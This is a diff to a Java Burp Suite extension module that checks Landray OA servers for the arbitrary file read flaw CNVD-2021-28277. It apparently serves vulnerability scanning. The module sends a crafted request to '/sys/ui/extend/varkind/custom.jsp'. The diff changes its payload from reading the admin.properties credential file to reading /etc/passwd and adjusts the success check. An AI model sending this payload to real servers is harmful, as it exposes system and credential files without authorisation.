@@ -15,6 +15,12 @@ import java.io.IOException;
 import java.util.List;
 
 public class LandrayOa extends VulTaskImpl {
+    /**
+     * CNVD-2021-28277
+     * 蓝凌oa任意文件读取
+     * https://www.cnvd.org.cn/flaw/show/CNVD-2021-28277
+     *
+     */
 
     public static VulTaskImpl getInstance(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, List<BurpExtender.LogEntry> log){
         return new LandrayOa(helpers, callbacks, log);
@@ -27,7 +33,7 @@ public class LandrayOa extends VulTaskImpl {
     public void run() {
         //新的请求包
         url = iHttpService.getProtocol() + "://" + iHttpService.getHost() + ":" + iHttpService.getPort() + "/sys/ui/extend/varkind/custom.jsp";
-        String poc_body = "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}";
+        String poc_body = "var={\"body\":{\"file\":\"file:///etc/passwd\"}}";
         //新请求
         okHttpRequester.send(url, method, request_header_list, query, poc_body, contentYtpe, new LandrayOaCallback(this));
         BurpExtender.vulsChecked.add("burp.vuls.LandrayOa" + host + iHttpService.getPort()); //添加检测标记
@@ -51,8 +57,8 @@ class LandrayOaCallback implements Callback {
         if (response.isSuccessful()){
             vulTask.setOkhttpMessage(call, response); //保存okhttp的请求响应信息
             // 检查响应体是否有内容
-            if (vulTask.ok_respBody.length() > 0) {
-                vulTask.message = "LandrayOa Vul";
+            if (vulTask.ok_respBody.length() > 5) {
+                vulTask.message = "LandrayOa-RadeAny";
                 vulTask.log(call);
             }
         }
